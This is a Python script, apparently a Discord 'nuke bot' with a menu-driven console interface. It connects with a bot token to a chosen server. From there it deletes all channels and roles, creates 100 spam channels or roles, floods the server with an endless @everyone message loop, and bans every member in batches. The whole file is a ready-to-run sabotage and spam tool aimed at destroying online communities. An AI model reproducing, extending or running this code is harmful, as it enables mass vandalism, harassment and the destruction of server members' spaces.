import pip
import asyncio
import os
import random

a = "discord"
def install(package):
    if hasattr(pip, 'main'):
        pip.main(['install', package])
    else:
        pip._internal.main(['install', package])

if __name__ == '__main__':
    install(a)

import discord
from discord.ext import commands

try:
    with open("bottoken", 'r') as file:
        TOKEN = file.read().strip()
except FileNotFoundError:
    print("File not found.")

os.system("cls")

menu = '''

██████╗░░█████╗░  ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗
██╔══██╗██╔══██╗  ████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝
██║░░██║██║░░╚═╝  ██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░
██║░░██║██║░░██╗  ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░
██████╔╝╚█████╔╝  ██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░
╚═════╝░░╚════╝░  ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░


[s]: Set bot token
[c]: Select target server

[1]: Delete channels
[2]: Channel maker
[3]: Role maker
[4]: Everyone spammer ( 1k/minute )
[5]: Delete all roles
[6]: Ban all
'''
print(menu)
aa = input("[]: ")


if aa == "c":
    if os.path.isfile("selected_server.txt"):
        os.remove("selected_server.txt")
    intents = discord.Intents.default()
    intents.guilds = True
    bot = commands.Bot(command_prefix='!', intents=intents)

    @bot.event
    async def on_ready():
        print(f'{bot.user.name} has connected to Discord!')
        
        guilds = bot.guilds
        os.system("cls")
        print("")
        print("Bot is in the following servers: \n")
        for i, guild in enumerate(guilds, start=1):
            print(f"{i}. {guild.name} (ID: {guild.id})")

        chosen_name = input("\nEnter the name of the server: ")

        selected_guild = None
        for guild in guilds:
            if guild.name.lower() == chosen_name.lower(): 
                selected_guild = guild
                break
        
        if selected_guild:
            print(f"Selected server: {selected_guild.name}")
            
            with open("selected_server.txt", "w") as f:
                f.write(str(selected_guild.id))
            print(f"Server ID {selected_guild.id} saved to 'selected_server.txt'.")
            os.startfile("runner.py")
            exit()

        else:
            print(f"No server found with the name: {chosen_name}")
            exit()

    bot.run(TOKEN)



if aa == "s":
    if os.path.isfile("bottoken"):
        os.remove("bottoken")
    os.system("cls")
    settoken = input("[Your bots token]: ")
    with open("bottoken", "a+") as f:
        f.write(settoken)
    os.startfile("runner.py")


# channel deleter (requires 'Manage Channels' permission)
if aa == "1":
    intents = discord.Intents.default()
    intents.guilds = True
    bot = commands.Bot(command_prefix='!', intents=intents)

    @bot.event
    async def on_ready():
        print(f'{bot.user.name} has connected to Discord!')

        try:
            with open("selected_server.txt", "r") as f:
                server_id = f.read().strip() 
        except FileNotFoundError:
            print("Error: 'selected_server.txt' not found.")
            exit()

        selected_guild = discord.utils.get(bot.guilds, id=int(server_id))
        if not selected_guild:
            print(f"Error: No server found with ID {server_id}")
            exit()

        os.system("cls")
        print("Removing all channels, press CTRL + C to force stop the program if you want")
        delete_tasks = [channel.delete() for channel in selected_guild.channels]
        await asyncio.gather(*delete_tasks)
        print(f"All channels in {selected_guild.name} have been nuked! 💥")

        os.startfile("runner.py")
        exit()

    bot.run(TOKEN)



# channel maker (requires 'Manage Channels' permission)
if aa == "2":
    cname = input("Name of the channels: ")
    intents = discord.Intents.default()
    intents.guilds = True 
    bot = commands.Bot(command_prefix='!', intents=intents)

    @bot.event
    async def on_ready():
        print(f'{bot.user.name} has connected to Discord!')

        try:
            with open("selected_server.txt", "r") as f:
                server_id = f.read().strip()
        except FileNotFoundError:
            print("Error: 'selected_server.txt' not found.")
            exit()

        selected_guild = discord.utils.get(bot.guilds, id=int(server_id))
        if not selected_guild:
            print(f"Error: No server found with ID {server_id}")
            exit()
        
        os.system("cls")
        print("Creating 100 channels, press CTRL + C to force stop the program if you want") 
        for _ in range(100):
            await selected_guild.create_text_channel(cname)
        print("100 channels have been created")

        os.startfile("runner.py")
        exit()

    bot.run(TOKEN)


# role maker (requires 'Manage Roles' permission)
if aa == "3":
    rname = input("Spam roles name: ")
    intents = discord.Intents.default()
    intents.guilds = True  
    bot = commands.Bot(command_prefix='!', intents=intents)

    @bot.event
    async def on_ready():
        print(f'{bot.user.name} has connected to Discord!')

        try:
            with open("selected_server.txt", "r") as f:
                server_id = f.read().strip()
        except FileNotFoundError:
            print("Error: 'selected_server.txt' not found.")
            exit()

        selected_guild = discord.utils.get(bot.guilds, id=int(server_id))
        if not selected_guild:
            print(f"Error: No server found with ID {server_id}")
            exit()

        os.system("cls")
        print(f"Creating 100 roles, press CTRL + C to force stop the program if you want")
        for _ in range(100):
            await selected_guild.create_role(name=rname, color=discord.Color.default())
        print("100 roles have been created")

        os.startfile("runner.py")
        exit()

    bot.run(TOKEN)


# everyone spammer (requires 'Send Messages' permission)
if aa == "4":
    intents = discord.Intents.default()
    intents.guilds = True 
    bot = commands.Bot(command_prefix='!', intents=intents)

    @bot.event
    async def on_ready():
        print(f'{bot.user.name} has connected to Discord!')
        os.system("cls")
        custom_text = input("Do you want any custom text to the everyone spam? (Press Enter if not): ")

        try:
            with open("selected_server.txt", "r") as f:
                server_id = f.read().strip()
        except FileNotFoundError:
            print("Error: 'selected_server.txt' not found.")
            exit()

        selected_guild = discord.utils.get(bot.guilds, id=int(server_id))
        if not selected_guild:
            print(f"Error: No server found with ID {server_id}")
            exit()

        channels = selected_guild.text_channels
        count = 0
        batch_size = 100

        async def send_message(channel):
            everyone_spam = f"@everyone {custom_text}"
            await channel.send(everyone_spam)

            os.system("cls")
            print("If you think it's slow, make more channels | Everyone spam sent, press CTRL + C to force stop the program if you want")

        while count < 100000000:
            tasks = []
            for _ in range(batch_size):
                random_channel = random.choice(channels)
                task = asyncio.create_task(send_message(random_channel))
                tasks.append(task)
                count += 1
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.1)

    bot.run(TOKEN)


# role remover (requires 'Manage Roles' permission)
if aa == "5":
    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True
    bot = commands.Bot(command_prefix='!', intents=intents)

    @bot.event
    async def on_ready():
        print(f'{bot.user.name} has connected to Discord!')

        try:
            with open("selected_server.txt", "r") as f:
                server_id = f.read().strip()
        except FileNotFoundError:
            print("Error: 'selected_server.txt' not found.")
            exit()

        selected_guild = discord.utils.get(bot.guilds, id=int(server_id))
        if not selected_guild:
            print(f"Error: No server found with ID {server_id}")
            exit()

        os.system("cls")
        print(f"Removing all roles, press CTRL + C to force stop the program if you want")
        roles = [role for role in selected_guild.roles if role.name != "@everyone"]
        delete_tasks = [role.delete() for role in roles]
        await asyncio.gather(*delete_tasks)
        print("All roles have been deleted")

        os.startfile("runner.py")
        exit()

    bot.run(TOKEN)


# ban all (requires 'Ban Members' permission)
if aa == "6":
    intents = discord.Intents.default()
    intents.members = True
    intents.guilds = True
    bot = commands.Bot(command_prefix='!', intents=intents)

    @bot.event
    async def on_ready():
        print(f'{bot.user.name} has connected to Discord!')

        try:
            with open("selected_server.txt", "r") as f:
                server_id = f.read().strip()
        except FileNotFoundError:
            print("Error: 'selected_server.txt' not found.")
            exit()

        selected_guild = discord.utils.get(bot.guilds, id=int(server_id))
        if not selected_guild:
            print(f"Error: No server found with ID {server_id}")
            exit()

        print(f"Banning all members, press CTRL + C to force stop the program if you want")
        bot_user = bot.user
        members = [member for member in selected_guild.members if member != bot_user]
        batch_size = 100 

        async def ban_member(member):
            try:
                await member.ban(reason="Mass ban script")
            except Exception as e:
                print(f"Failed to ban {member.name}: {e}")

        while members:
            batch = members[:batch_size]
            members = members[batch_size:]
            tasks = [ban_member(member) for member in batch]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.1) 

        print("All members have been banned, errors are normal here")
        os.startfile("runner.py")
        exit()

    bot.run(TOKEN)
